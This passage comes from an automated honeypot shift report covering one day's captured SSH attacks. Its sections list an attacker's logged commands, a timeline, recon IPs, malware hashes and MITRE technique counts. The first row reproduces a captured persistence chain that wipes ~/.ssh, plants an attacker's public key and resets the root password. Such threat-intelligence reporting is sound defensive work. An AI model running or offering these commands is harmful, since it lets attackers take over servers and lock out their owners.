| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:uDghteW3iGXy"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-29 16:26:40` | `cowrie.session.connect` |
| `2026-03-29 16:26:40` | `cowrie.client.version` |
| `2026-03-29 16:26:42` | `cowrie.client.kex` |
| `2026-03-29 16:26:44` | `cowrie.login.success` |
| `2026-03-29 16:26:45` | `cowrie.session.params` |
| `2026-03-29 16:26:45` | `cowrie.command.input` |
| `2026-03-29 16:26:45` | `cowrie.command.failed` |
| `2026-03-29 16:26:45` | `cowrie.log.closed` |
| `2026-03-29 16:26:46` | `cowrie.session.params` |
| `2026-03-29 16:26:46` | `cowrie.command.input` |
| `2026-03-29 16:26:48` | `cowrie.session.file_download` |
| `2026-03-29 16:26:48` | `cowrie.log.closed` |
| `2026-03-29 16:27:00` | `cowrie.session.params` |
| `2026-03-29 16:27:00` | `cowrie.command.input` |
| `2026-03-29 16:27:00` | `cowrie.log.closed` |
| `2026-03-29 16:27:01` | `cowrie.session.params` |
| `2026-03-29 16:27:01` | `cowrie.command.input` |
| `2026-03-29 16:27:01` | `cowrie.log.closed` |
| `2026-03-29 16:27:05` | `cowrie.session.params` |
| `2026-03-29 16:27:05` | `cowrie.command.input` |
| `2026-03-29 16:27:06` | `cowrie.session.file_download` |
| `2026-03-29 16:27:06` | `cowrie.log.closed` |
| `2026-03-29 16:27:06` | `cowrie.session.params` |
| `2026-03-29 16:27:06` | `cowrie.command.input` |
| `2026-03-29 16:27:06` | `cowrie.log.closed` |
| `2026-03-29 16:27:07` | `cowrie.session.params` |
| `2026-03-29 16:27:07` | `cowrie.command.input` |
| `2026-03-29 16:27:07` | `cowrie.log.closed` |
| `2026-03-29 16:27:09` | `cowrie.session.params` |
| `2026-03-29 16:27:09` | `cowrie.command.input` |
| `2026-03-29 16:27:09` | `cowrie.command.input` |
| `2026-03-29 16:27:10` | `cowrie.log.closed` |
| `2026-03-29 16:27:10` | `cowrie.session.params` |
| `2026-03-29 16:27:10` | `cowrie.command.input` |
| `2026-03-29 16:27:10` | `cowrie.log.closed` |
| `2026-03-29 16:27:11` | `cowrie.session.params` |
| `2026-03-29 16:27:11` | `cowrie.command.input` |
| `2026-03-29 16:27:11` | `cowrie.log.closed` |
| `2026-03-29 16:27:12` | `cowrie.session.params` |
| `2026-03-29 16:27:12` | `cowrie.command.input` |
| `2026-03-29 16:27:13` | `cowrie.log.closed` |
| `2026-03-29 16:27:13` | `cowrie.session.params` |
| `2026-03-29 16:27:13` | `cowrie.command.input` |
| `2026-03-29 16:27:14` | `cowrie.log.closed` |
| `2026-03-29 16:27:14` | `cowrie.session.params` |
| `2026-03-29 16:27:14` | `cowrie.command.input` |
| `2026-03-29 16:27:15` | `cowrie.log.closed` |
| `2026-03-29 16:27:17` | `cowrie.session.params` |
| `2026-03-29 16:27:17` | `cowrie.command.input` |
| `2026-03-29 16:27:17` | `cowrie.log.closed` |
| `2026-03-29 16:27:18` | `cowrie.session.params` |
| `2026-03-29 16:27:18` | `cowrie.command.input` |
| `2026-03-29 16:27:19` | `cowrie.log.closed` |
| `2026-03-29 16:27:19` | `cowrie.session.params` |
| `2026-03-29 16:27:19` | `cowrie.command.input` |
| `2026-03-29 16:27:20` | `cowrie.log.closed` |
| `2026-03-29 16:27:21` | `cowrie.session.params` |
| `2026-03-29 16:27:21` | `cowrie.command.input` |
| `2026-03-29 16:27:22` | `cowrie.log.closed` |
| `2026-03-29 16:27:23` | `cowrie.session.params` |
| `2026-03-29 16:27:23` | `cowrie.command.input` |
| `2026-03-29 16:27:24` | `cowrie.log.closed` |
| `2026-03-29 16:27:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.54[.]95` to AbuseIPDB if not already reported
- [ ] Block `101.126.54[.]95` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `101.126.54[.]95` | **19** | 2026-03-29 16:10 | 2026-03-29 16:30 | 32m | 2 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `103.191.92[.]72` | 1 | 2026-03-29 15:57 | 2026-03-29 15:58 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `104.155.27[.]128` | 1 | 2026-03-29 14:53 | 2026-03-29 14:53 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `111.23.117[.]116` | 1 | 2026-03-29 14:33 | 2026-03-29 14:33 | 8s | 0 | `T1592` | 🟢 LOW |
| `111.70.32[.]7` | 1 | 2026-03-29 15:38 | 2026-03-29 15:38 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `116.113.241[.]82` | 1 | 2026-03-29 14:33 | 2026-03-29 14:33 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `120.48.106[.]205` | 1 | 2026-03-29 15:50 | 2026-03-29 15:52 | 120s | 0 | `T1592` | 🟢 LOW |
| `124.129.157[.]189` | 1 | 2026-03-29 15:24 | 2026-03-29 15:24 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.164[.]204` | 1 | 2026-03-29 16:16 | 2026-03-29 16:17 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `150.246.249[.]149` | 1 | 2026-03-29 14:39 | 2026-03-29 14:39 | 31s | 0 | `T1592` | 🟢 LOW |
| `170.233.29[.]175` | 1 | 2026-03-29 16:24 | 2026-03-29 16:24 | 11s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `186.148.187[.]172` | 1 | 2026-03-29 14:33 | 2026-03-29 14:33 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `191.6.25[.]239` | 1 | 2026-03-29 16:20 | 2026-03-29 16:20 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `211.20.26[.]201` | 1 | 2026-03-29 15:33 | 2026-03-29 15:33 | 6s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `220.163.252[.]244` | 1 | 2026-03-29 16:13 | 2026-03-29 16:13 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `221.163.22[.]86` | 1 | 2026-03-29 14:41 | 2026-03-29 14:42 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `46.101.114[.]131` | 1 | 2026-03-29 14:59 | 2026-03-29 14:59 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `52.168.141[.]47` | 1 | 2026-03-29 16:03 | 2026-03-29 16:03 | 8s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `62.192.226[.]83` | 1 | 2026-03-29 15:00 | 2026-03-29 15:00 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `62.201.228[.]210` | 1 | 2026-03-29 15:13 | 2026-03-29 15:13 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `65.20.168[.]147` | 1 | 2026-03-29 15:13 | 2026-03-29 15:13 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `66.186.235[.]89` | 1 | 2026-03-29 15:04 | 2026-03-29 15:04 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `75.64.180[.]83` | 1 | 2026-03-29 14:53 | 2026-03-29 14:53 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `76.124.3[.]157` | 1 | 2026-03-29 15:33 | 2026-03-29 15:33 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `90.230.226[.]175` | 1 | 2026-03-29 15:19 | 2026-03-29 15:19 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `94.20.183[.]47` | 1 | 2026-03-29 16:12 | 2026-03-29 16:13 | 30s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (11 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **28/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `116.113.241[.]82` | CN | InnerMongoliaAlashanZXHB52MH01huawei3 | **100** ⚠️ | 23 |
| `94.20.183[.]47` | AZ | Delta Telecom Ltd | **100** ⚠️ | 19 |
| `111.70.32[.]7` | TW | Chunghwa Telecom Co.,Ltd. | **100** ⚠️ | 36 |
| `104.155.27[.]128` | BE | Google LLC | **100** ⚠️ | 34 |
| `103.191.92[.]72` | ID | PT MAJU BERSAMA TEPAT GUNA | **100** ⚠️ | 38 |
| `186.148.187[.]172` | CO | TV AZTECA SUCURSAL COLOMBIA | **100** ⚠️ | 50 |
| `120.48.106[.]205` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |
| `75.64.180[.]83` | US | Comcast Cable Communications Holdings, Inc | **100** ⚠️ | 5 |
| `62.201.228[.]210` | IQ | IQ Networks for Data and Internet Services Ltd | **100** ⚠️ | 50 |
| `191.6.25[.]239` | BR | TURBONETT TELECOMUNICACOES LTDA. - ME | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 55 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 24 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 12 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 7 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 7 |

---

## 🔕 False Positive Summary (13 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 10 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 69 cases |
| Tool 34  | Credential Extractor        | ✅ 36 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 0 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 39 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 13 filtered (18.8%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 30 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 11 files |
| Tool 33  | YARA Classifier             | ✅ 4 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 12 priority case(s) shown individually · 26 recon entry/entries in table (1 group(s) consolidating 19 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-29T16:33:17Z_
